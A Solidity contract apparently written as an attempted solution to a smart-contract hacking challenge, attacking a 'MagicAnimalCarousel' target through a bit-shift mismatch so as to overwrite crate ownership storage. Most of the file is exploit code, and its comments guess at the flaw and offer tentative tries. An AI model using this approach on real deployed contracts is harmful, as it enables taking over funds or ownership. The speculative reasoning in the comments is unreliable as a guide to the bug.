// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IMagicAnimalCarousel {
    function setAnimalAndSpin(string calldata animal) external;
    function changeAnimal(string calldata animal, uint256 crateId) external;
    function carousel(uint256 crateId) external view returns (uint256);
    function currentCrateId() external view returns (uint256);
    function encodeAnimalName(string calldata animalName) external pure returns (uint256);
}

contract MagicExploit {
    IMagicAnimalCarousel public target;
    address public owner;
    
    constructor(address _target) {
        target = IMagicAnimalCarousel(_target);
        owner = msg.sender;
    }
    
    function exploit() external {
        // The vulnerability is in the bit shifting difference
        // setAnimalAndSpin shifts by 176 bits: encodedAnimal << (160 + 16)
        // changeAnimal shifts by 160 bits: encodedAnimal << 160
        
        // This means data stored by setAnimalAndSpin is 16 bits off from changeAnimal
        // We can exploit this to overwrite or manipulate storage
        
        // First, let's understand the initial state
        uint256 initialCrate0 = target.carousel(0);
        
        // In constructor, carousel[0] ^= 1 << 160
        // This sets the nextCrateId to 1 (16 bits at position 160)
        
        // Let's use changeAnimal on crate 0 with empty owner
        // Since owner is 0, anyone can change it
        target.changeAnimal("A", 0);
        
        // Now let's try to manipulate the storage by exploiting the shift difference
        // We need to craft an animal name that when shifted differently will cause issues
        
        // The goal might be to overwrite the factory address or some critical storage
        // Let's try to become owner of crate 0xFFFF (MAX_CAPACITY)
        target.changeAnimal("", 65535);
    }
    
    function craftExploit() external {
        // Try to exploit the bit shift vulnerability
        // When we use setAnimalAndSpin, the animal is shifted by 176
        // But changeAnimal expects it at 160
        
        // This 16-bit difference can cause overlap with the owner field
        // Let's set an animal that will overflow into other fields
        
        // Maximum animal name is 12 bytes = 96 bits
        // After encoding, it becomes 80 bits max
        string memory longAnimal = "AAAAAAAAAAAA"; // 12 A's
        
        target.setAnimalAndSpin(longAnimal);
        
        // Now the currentCrateId has moved
        uint256 newCrateId = target.currentCrateId();
        
        // Try to change animal at the new crate with exploit
        target.changeAnimal("B", newCrateId);
    }
    
    function directExploit() external {
        // The key insight: in setAnimalAndSpin, there's a bug
        // encodedAnimal = encodeAnimalName(animal) >> 16;
        // This right-shifts the encoded value by 16 bits BEFORE storing
        // Then it's left-shifted by 176 bits
        
        // But in changeAnimal, the encoded value is directly shifted by 160 bits
        // This creates a mismatch!
        
        // Let's exploit this to write to arbitrary storage
        // We need to find what makes this level "complete"
        
        // Try setting carousel[1] to have our address as owner
        target.changeAnimal("exploit", 1);
    }
}